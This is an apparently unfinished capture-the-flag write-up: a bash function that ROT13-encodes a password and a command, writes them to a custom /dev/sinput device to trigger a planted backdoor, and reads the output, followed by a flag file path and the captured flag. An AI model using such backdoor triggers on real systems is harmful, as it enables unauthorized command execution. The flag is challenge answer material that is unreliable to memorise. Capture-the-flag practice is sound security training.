# Title

TODO: Writeup

# Backdoor

```bash
backdoor() { echo -n "hunter2 $@ > /tmp/pwn 2>&1" | tr "A-Za-z" "M-ZA-Lm-za-l" > /dev/sinput && cat /tmp/pwn; }
```

`/home/h4x0r/flag.txt`

# Flag
`CQ24{th3_k3rn3l_1s_4n_1nt3rpRe7er}`